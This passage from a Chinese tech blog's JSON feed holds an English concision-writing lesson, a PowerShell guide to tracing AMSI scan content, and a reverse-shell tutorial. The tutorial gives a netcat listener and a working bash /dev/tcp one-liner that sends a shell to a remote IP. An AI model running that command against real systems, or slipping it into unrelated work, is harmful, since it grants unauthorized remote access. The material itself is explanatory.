</mtext><mi>q</mi><mi>u</mi><mi>a</mi><mi>l</mi><mi>i</mi><mi>t</mi><mi>y</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{stability \\; and \\; quality}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">s</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"color:red;\">b</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">y</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mord mathnormal\" style=\"color:red;\">d</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">q</span><span class=\"mord mathnormal\" style=\"color:red;\">u</span><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">y</span></span></span></span></span>  of our financial performance will <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>b</mi><mi>e</mi><mtext>  </mtext><mi>d</mi><mi>e</mi><mi>v</mi><mi>e</mi><mi>l</mi><mi>o</mi><mi>p</mi><mi>e</mi><mi>d</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{be \\; developed}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">b</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">d</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">v</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">p</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">d</span></span></span></span></span>  through the profitable <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>e</mi><mi>x</mi><mi>e</mi><mi>c</mi><mi>u</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{execution}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">x</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"color:red;\">u</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span></span></span></span></span>  of our existing business, as well as the <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>a</mi><mi>c</mi><mi>q</mi><mi>u</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>  </mtext><mi>o</mi><mi>r</mi><mtext>  </mtext><mi>d</mi><mi>e</mi><mi>v</mi><mi>e</mi><mi>l</mi><mi>o</mi><mi>p</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{acquisition \\; or \\; development}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">a</span><span class=\"mord mathnormal\" style=\"color:red;\">c</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">q</span><span class=\"mord mathnormal\" style=\"color:red;\">u</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">s</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;color:red;\">r</span><span class=\"mspace\" style=\"color:red;margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\" style=\"color:red;\">d</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">v</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;color:red;\">l</span><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"color:red;\">p</span><span class=\"mord mathnormal\" style=\"color:red;\">m</span><span class=\"mord mathnormal\" style=\"color:red;\">e</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span><span class=\"mord mathnormal\" style=\"color:red;\">t</span></span></span></span></span>  of new businesses.<br>\n 修改后：<br>\nWe will improve our financial performance not only by executing our existing business more profitably but by acquiring or developing new businesses.</p>\n<p>解析： stability and quality 并没有带给句子更多意义，故舍去。<br>\n被动句式换为主动式，be developed -&gt; improve。<br>\n名词换为动词进行式，省略 of， through the profitable execution -&gt; by executing。</p>\n<p>修改方法：</p>\n<ul>\n<li>\n<p>删去不必要的形容词及形容词的名词形式</p>\n</li>\n<li>\n<p>化被动句式为主动句式</p>\n</li>\n<li>\n<p>动词的名词形式换为主动形式，例如 -ing</p>\n</li>\n</ul>\n<h4 id=\"3-介词短语字符串strings-of-prepositional-phrases\"><a class=\"markdownIt-Anchor\" href=\"#3-介词短语字符串strings-of-prepositional-phrases\">#</a> 3. 介词短语字符串（Strings of Prepositional Phrases）</h4>\n<p>经常与弱动词、晦涩名词相关联，严重依赖介词。若一行中出现 3 个介词，尝试修改。<br>\n例：<br>\nThe more reasoned analysis made by the Saint-Simonians <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span>  the nature <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span>  the new power situation <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>i</mi><mi>n</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{in}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span></span></span></span></span>  France and <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span>  the reasons the new power situation <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>i</mi><mi>n</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{in}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">i</span><span class=\"mord mathnormal\" style=\"color:red;\">n</span></span></span></span></span>  France and <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span>  the reasons the present government could not satisfy the needs <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>o</mi><mi>f</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{of}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;color:red;\">f</span></span></span></span></span>  the people was confirmed <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mstyle mathcolor=\"red\"><mrow><mi>b</mi><mi>y</mi></mrow></mstyle></mrow><annotation encoding=\"application/x-tex\">\\color{red}{by}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\" style=\"color:red;\"><span class=\"mord mathnormal\" style=\"color:red;\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;color:red;\">y</span></span></span></span></span>  these developments.<br>\n 修改后：<br>\nThese developments confirmed the Saint-Simonians’ more reasoned analysis of the new power situation in France and of the present government’s inability to satisfy the people’s needs.</p>\n<p>解析：<br>\n句子主体为被动句式，有 7 个介词短语。将句子改为主动句式可以去掉一个。<br>\nwas confirmed by these developments -&gt; these developments confirmed。<br>\nof the nature of the new power 与 of the new power 意义几无差别，故替换。<br>\nmade by the Saint-Simonians -&gt; Saint-Simonians’<br>\nthe needs of the people -&gt; people’s needs<br>\nof the reasons 与 reasoned analysis 意义重复，故略去</p>\n<p>修改方法：</p>\n<ul>\n<li>删去无意义语句，例如： is illustrated by the fact  \\  there will be</li>\n<li>用所有格形式替换介词短语，例如：the needs of the people -&gt; people’s needs</li>\n<li>删去重复说明，例如：<s>During the discussion period,</s> the stockholders will dicuss  Company interest.</li>\n</ul>\n<h3 id=\"修改捷径\"><a class=\"markdownIt-Anchor\" href=\"#修改捷径\">#</a> 修改捷径</h3>\n<h4 id=\"1-常规套路精简\"><a class=\"markdownIt-Anchor\" href=\"#1-常规套路精简\">#</a> 1. 常规套路精简</h4>\n<p>除了上述三种冗余特征，我们还应注意特定的结构，句式。</p>\n<ul>\n<li>\n<p><strong>用主动式代替包夹在弱动词和介词间的名词或形容词</strong><br>\n is indicative of -&gt; indicates,  have an influence on -&gt; influence,<br>\ngives consideration to -&gt; considers,  make an assessment of -&gt; assess,<br>\nis capable of -&gt; can,  make use of -&gt; use,  is of interest to -&gt; interests,<br>\nis benefit to -&gt; benefits</p>\n</li>\n<li>\n<p><strong>以 tion 结尾的名词 + of 替换 为动名词</strong><br>\n by the implementation of the plan -&gt; by implementing the plan<br>\nin the creation of  -&gt; in creating<br>\nby the addition of -&gt; by adding</p>\n</li>\n<li>\n<p><strong>对于某些关系从句，可以删去主语和宾语</strong><br>\n There are at least two larger opportunities <s>that exist</s> in this area.<br>\nThose <s>who are</s> invited to participate on the panel pay their own travel expense.<br>\nThe result is an organization <s>that is</s> uniquely tailored to its customer base.</p>\n</li>\n<li>\n<p><strong>对于某些关系从句，用一个或几个词替换删去的部分</strong><br>\n Poor households pay more for [<s>the</s>] <em><strong>their</strong></em> food [<s>that they buy</s>] because local merchants exploit them.<br>\nFundamental to our operation [<s>is the variety of</s>] <em><strong>are our many community</strong></em> services [<s>that our company has to offer to the community</s>].</p>\n</li>\n<li>\n<p><strong>删除重复含义的短语</strong><br>\n in the case of,  in character,   of the fact that,  of xx quality,  the factor of,  degree of<br>\nThey showed a greater [<s>degree of</s>] interest in the outcome.</p>\n</li>\n<li>\n<p><strong>注意⚠️</strong><br>\n确保修改后的句子，与原句语义差别不大，没有丢失重要内容。</p>\n</li>\n</ul>\n<h4 id=\"2-选择实惠的单词\"><a class=\"markdownIt-Anchor\" href=\"#2-选择实惠的单词\">#</a> 2. 选择实惠的单词</h4>\n<p>在写作中，我们常被要求使用生动的动词和具体的名词，如果没有这样做，就会有冗余产生。<br>\n例如，描写走的姿态除了我们熟知的 walk，还可以用 trudge (a long difficult walk), amble (a leisurely walk), stroll (a leisurely walk), lumber (move heavily or clumsily), stride (walk with long steps), lope (run easily)<br>\n 例： He walked wearily and laboriously.  -&gt; He trudged.<br>\n 例如，车辆除了用 car，还可以用更具体的名词代替。例如：coupe, sedan, convertible, station wagon.<br>\n 更准确生动的用词会让句子提供更多信息量。<br>\n例：A car usually travels fifteen times faster than a person walking. -&gt; A Mercedes travels twenty times faster than a strolling minstrel.</p>\n<ul>\n<li>\n<p><strong>错用修饰词造成冗余</strong><br>\n例如： finally concluded 中 conclude 就有最终决定的含义，finally 为多余修饰词<br>\n类似的还有： first introduced,   a temporary sojourn (逗留),  totally devoid (全无的) of,  flawless (完美的) perfection,  a small trifle (琐事),  a new innovation,  on first entering,  straight linear movement,  general consensus (一致的意见)</p>\n</li>\n<li>\n<p><strong>介词短语冗余</strong><br>\n例： asist us <s>with their help</s>,  green <s>in color</s>,  handsom <s>in appearance</s>,  rectangular <s>in shape</s></p>\n</li>\n<li>\n<p><strong>程度副词造成的冗余</strong><br>\n合适的单词可能完全不需要程度副词 — very, really, truly, actually 等修饰，而不合适的单词，即使使用程度副词对于其补益也不足。<br>\n例： very large -&gt; enormous /huge/gigantic /massive<br>\n 而对于某些有绝对含义的单词 — pure, unique, complete 等，使用程度副词反而会降低单词原本的含义。<br>\n例： really terrific (极好的),  absolutely stunning (极好的),   truly sensational (非常好的),  extremely vital (至关重要的)</p>\n</li>\n</ul>\n<h4 id=\"3-不言自明\"><a class=\"markdownIt-Anchor\" href=\"#3-不言自明\">#</a> 3. 不言自明</h4>\n<p>例： <s><strong>In this paper I will discuss</strong></s> three aspects of contemporary life that …<br>\n 去掉前六个单词，对整句话的含义没有一点点影响<br>\n例： The third chapter <s><strong>of the book</strong></s> deals with administrative problems and <s><strong>the solutions that have been proposed for these problems</strong></s> [proposed solutions]<br>\n solutions 紧跟在 problem 后，所以不用言明，读者也知道其针对的是这些 problem</p>\n<h4 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结：</h4>\n<p>精简句子如同健身塑形一样，想变得苗条总是比变胖需要付出更多努力，不过当你熟悉之后，也会渐渐爱上这种精益求精的快乐，如同看着自己的马甲线逐渐显现时的喜悦。<br>\n推荐的三个修改步骤：<br>\n<strong>1. 逐句筛查</strong><br>\n<strong> 2. 舍弃无用词</strong><br>\n<strong> 3. 替换弱动词</strong></p>\n<p>当你从修改中不断汲取经验时，你的写作技巧也会越来越好。你的文章所需的修改也会渐渐变少。</p>\n",
            "tags": [
                "Line By Line"
            ]
        },
        {
            "id": "https://snowroll.github.io/powershell-amsi-trace/",
            "url": "https://snowroll.github.io/powershell-amsi-trace/",
            "title": "利用事件写入捕获AMSI实际检测内容",
            "date_published": "2022-08-31T15:16:53.000Z",
            "content_html": "<h1 id=\"动机\"><a class=\"markdownIt-Anchor\" href=\"#动机\">#</a> 动机</h1>\n<p>在 PowerShell 命令行中执行 PowerShell 脚本时，windows 默认会将执行的内容传送给 AMSI 进行检测，如果检测结果认为执行内容中包含病毒，则拒绝执行，实现安全防护。</p>\n<p>AMSI 的<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93aW4zMi9hbXNpL2hvdy1hbXNpLWhlbHBz\">官方文档</span>宣称可以对混淆 PowerShell 脚本最终的无混淆结果进行检测，为了知道 AMSI 运行中具体对脚本的哪些内容进行了捕获检测，我们尝试截获输出传给 AMSI 的脚本内容。主要参考了 YouTube 上的一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1qaXhjTmotTWM0MA==\">技术视频</span>进行了实现。</p>\n<h1 id=\"具体做法\"><a class=\"markdownIt-Anchor\" href=\"#具体做法\">#</a> 具体做法</h1>\n<ol>\n<li>\n<p>使用 <code>logman</code>  创建和控制事件跟踪进程</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 每一次监控，可以更改名称 AMSITraceTest.etl</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 开始跟踪</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> start 开始 -ets 直接向事件跟踪会话发送命令，无需保存或调度</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> --% 告诉powershell 停止解释内联PS代码的命令行</span></span><br><span class=\"line\">logman --% start AMSITraceTest -p Microsoft-Antimalware-Scan-Interface (Event1) 0x4 -o AMSITraceTest.etl -ets</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>执行 PowerShell 脚本</p>\n</li>\n<li>\n<p>结束跟踪</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">logman stop AMSITraceTest -ets</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>读取事件内容</p>\n<p>编写一个 <code>GetAMSI.ps1</code> , 然后导入  <code>. GetAMSI.ps1</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Get-AMSITraceEvent</span></span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">param</span> (</span><br><span class=\"line\">    [<span class=\"type\">Parameter</span>(<span class=\"type\">Mandatory</span>)]</span><br><span class=\"line\">    [<span class=\"built_in\">String</span>]</span><br><span class=\"line\">    <span class=\"variable\">$FilePath</span></span><br><span class=\"line\">  )</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-Path</span> <span class=\"variable\">$FilePath</span> <span class=\"literal\">-Oldest</span> <span class=\"literal\">-FilterXPath</span> <span class=\"string\">&#x27;*[System[EventID = 1101]]&#x27;</span> | <span class=\"built_in\">ForEach-Object</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$_</span>.Properties[<span class=\"number\">2</span>].Value) &#123;</span><br><span class=\"line\">      <span class=\"number\">0</span> &#123; <span class=\"variable\">$ScanResult</span> = <span class=\"string\">&#x27;AMSI_RESULT_CLEAN&#x27;</span> &#125;</span><br><span class=\"line\">      <span class=\"number\">1</span> &#123; <span class=\"variable\">$ScanResult</span> = <span class=\"string\">&#x27;AMSI_RESULT_NOT_DETECTED&#x27;</span> &#125;</span><br><span class=\"line\">      <span class=\"number\">32768</span> &#123; <span class=\"variable\">$ScanResult</span> = <span class=\"string\">&#x27;AMSI_RESULT_DETECTED&#x27;</span> &#125;</span><br><span class=\"line\">      default &#123; <span class=\"variable\">$ScanResult</span> = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">2</span>].Value &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$ObjectProperties</span> = [<span class=\"type\">Ordered</span>] <span class=\"selector-tag\">@</span>&#123;</span><br><span class=\"line\">      TimeCreated = <span class=\"variable\">$_</span>.TimeCreated</span><br><span class=\"line\">      ProcessId = <span class=\"variable\">$_</span>.ProcessId</span><br><span class=\"line\">      ThreadId = <span class=\"variable\">$_</span>.ThreadId</span><br><span class=\"line\">      Session = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">0</span>].Value</span><br><span class=\"line\">      ScanStatus = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">1</span>].Value</span><br><span class=\"line\">      ScanResult = <span class=\"variable\">$ScanResult</span></span><br><span class=\"line\">      AppName = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">3</span>].Value</span><br><span class=\"line\">      ContentName = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">4</span>].Value</span><br><span class=\"line\">      ContentSize = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">5</span>].Value</span><br><span class=\"line\">      OriginalSize = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">6</span>].Value</span><br><span class=\"line\">      Content = ([<span class=\"type\">Text.Encoding</span>]::Unicode.GetString(<span class=\"variable\">$_</span>.Properties[<span class=\"number\">7</span>].Value))</span><br><span class=\"line\">      Hash = ((<span class=\"variable\">$_</span>.Properties[<span class=\"number\">8</span>].Value | % &#123; <span class=\"string\">&#x27;&#123;0:X2&#125;&#x27;</span> <span class=\"operator\">-f</span> <span class=\"variable\">$_</span> &#125;) <span class=\"operator\">-join</span> <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">      ContentFiltered = <span class=\"variable\">$_</span>.Properties[<span class=\"number\">9</span>].Value</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">New-Object</span> <span class=\"literal\">-TypeName</span> psobject <span class=\"literal\">-Property</span> <span class=\"variable\">$ObjectProperties</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后在 powershell 中执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Get-AMSITraceEvent -FilePath ./AMSITraceTest.etl</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n",
            "tags": [
                "powershell"
            ]
        },
        {
            "id": "https://snowroll.github.io/reverse-shell/",
            "url": "https://snowroll.github.io/reverse-shell/",
            "title": "反向shell",
            "date_published": "2022-08-13T07:05:11.000Z",
            "content_html": "<h1 id=\"什么是反向shell\"><a class=\"markdownIt-Anchor\" href=\"#什么是反向shell\">#</a> 什么是反向 shell</h1>\n<p>我们在客户端 A 通过 <code>ssh</code>  命令连接服务器 B，从而得到服务器 B 的终端命令行，客户端主动发起的这次连接过程我们称为正向 shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh test@10.10.10.1 </span><br></pre></td></tr></table></figure>\n<p>顾名思义，反向 shell 应该由服务器端 B 主动发起，而客户端 A 被动监听，接收这次连接。</p>\n<p>客户端 A （假设 ip 为 1.2.3.4）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 打开一个端口，监听连接请求</span></span><br><span class=\"line\">nc -lvvp 2333</span><br></pre></td></tr></table></figure>\n<p>nc（netcat）是 linux 中一个功能强大的网络命令行工具，常用于端口扫描，端口监听。</p>\n<p>参数说明：</p>\n<ul>\n<li>-l 使用监听模式</li>\n<li>-vv verbose，使用两次会有更多信息</li>\n<li>-p 本地端口</li>\n</ul>\n<p>客户端 A 打开了本地端口 2333，来监听连接请求。因此，我们只需要在服务器端 B 发起一个连接请求，将 B 的 shell 的输入输出发送过来即可完成反向 shell</p>\n<p>服务器端 B</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/1.2.3.4/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>这样就可以成功将 B 的 shell 命令行发送给 A，实现反向 shell</p>\n<p>参考文章： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84MGQ2YjVhNjEzNzI=\">https://www.jianshu.com/p/80d6b5a61372</span></p>\n<p>命令详解：</p>\n<ul>\n<li>bash 命令行</li>\n<li>-i 交互模式</li>\n<li>&gt;&amp; 输出重定向，1 &gt; 可以省略为 &gt;，将标准输出和标准错误输出都重定向到远程。 文件的三种状态，0 标准输入， 1 标准输出， 2 错误输出</li>\n<li>/dev/tcp/${host}/${port} 建立一个 socket 连接，连接到其他机器</li>\n<li>0&gt;&amp;1 标准输入重定向到标准输出，由于标准输出已经定向到了远端机器上，所以输入、输出都将定向到远端机器上，实现了反向 shell</li>\n</ul>\n<p>由于 Linux 下一切皆文件，所以可以使用 <code>/dev/tcp</code>  创建一个 socket 套接字，而 <code>/$&#123;host&#125;/$&#123;port&#125;</code>  则是传入的参数。</p>\n<h1 id=\"反向shell工具\"><a class=\"markdownIt-Anchor\" href=\"#反向shell工具\">#</a> 反向 shell 工具</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3NvY2tldC5pby9kZXBsb3kv\">gsocket.io</span></p>\n<h2 id=\"可能的问题\"><a class=\"markdownIt-Anchor\" href=\"#可能的问题\">#</a> 可能的问题</h2>\n<ul>\n<li>\n<p>shell 反弹失败</p>\n<p>可能原因 1:</p>\n<p>ubuntu 系统打开的终端默认为 